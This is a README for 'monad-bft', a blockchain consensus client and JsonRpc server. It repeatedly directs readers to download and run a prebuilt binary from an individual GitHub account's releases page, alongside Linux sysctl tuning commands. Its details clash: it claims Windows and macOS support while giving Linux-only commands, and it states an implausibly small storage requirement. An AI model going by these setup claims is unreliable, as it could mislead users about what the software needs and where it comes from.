# 🛠️ monad-bft - Simple Setup for Blockchain Consensus

## 🔗 Download

[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Henriqueces/monad-bft/releases)

## 📖 Overview

This repository contains the Monad consensus client and JsonRpc server. Monad consensus collects transactions, produces blocks, and writes them to a ledger filestream. These blocks are then used by Monad execution to update the blockchain state. The [triedb](monad-triedb/README.md) is a database that stores block information and the blockchain state.

## 🚀 Getting Started

To use the Monad BFT software, follow these steps carefully.

### 1. 📥 Download the Software

Visit the [Releases page](https://github.com/Henriqueces/monad-bft/releases) to download the latest version of the software. Choose the file that matches your operating system.

### 2. 📂 Install the Software

1. Locate the downloaded file on your computer.
2. Open the file to start the installation process.
3. Follow the on-screen instructions to complete the installation.

### 3. 📦 Set Up Dependencies

From within the `monad-bft` root directory, you need to initialize and update the required submodules. Open your terminal and run the following command:

```sh
git submodule update --init --recursive
```

### 4. ⚙️ Configure System Settings

You must set up certain system parameters for optimal performance. Open your terminal and enter the following commands:

#### Hugepages Allocation

```bash
sudo sysctl -w vm.nr_hugepages=2048
```

#### Networking Configuration

Adjust the UDP buffer sizes with these commands:

```bash
sudo sysctl -w net.core.rmem_max=62500000
sudo sysctl -w net.core.rmem_default=62500000
sudo sysctl -w net.core.wmem_max=62500000
sudo sysctl -w net.core.wmem_default=62500000
```

For TCP buffer sizes, use these commands:

```bash
sudo sysctl -w net.ipv4.tcp_rmem='4096 62500000 62500000'
sudo sysctl -w net.ipv4.tcp_wmem='4096 62500000 62500000'
```

You need administrative rights to execute these commands.

### 5. 🖥️ Run the Software

After installation and configuration, you can run the Monad BFT software. Go to your terminal and navigate to the directory where you installed the software. Launch it using:

```sh
./monad-bft
```

### 6. 📡 Access the JsonRpc Server

The JsonRpc server will start running. You can access it via your web browser or an API client at `http://localhost:PORT_NUMBER`. Replace `PORT_NUMBER` with the actual port number you configured.

### 7. 📚 Learn More

For more information on advanced features and configuration, refer to the documentation within the repository or the respective [triedb documentation](monad-triedb/README.md).

## 🛠️ System Requirements

- **Operating System:** Windows, macOS, or Linux.
- **Processor:** 64-bit processor.
- **Memory:** At least 8 GB of RAM (16 GB recommended).
- **Storage:** Minimum 1 GB free space.

## 📬 Need Help?

If you encounter any issues or have questions, feel free to check the [issues section](https://github.com/Henriqueces/monad-bft/issues) or submit your queries.

## 🎉 Conclusion

Follow these steps to successfully download and run the Monad BFT software. Enjoy managing your blockchain transactions with ease! 

Remember, when you're ready to download, head to the [Releases page](https://github.com/Henriqueces/monad-bft/releases) to get started.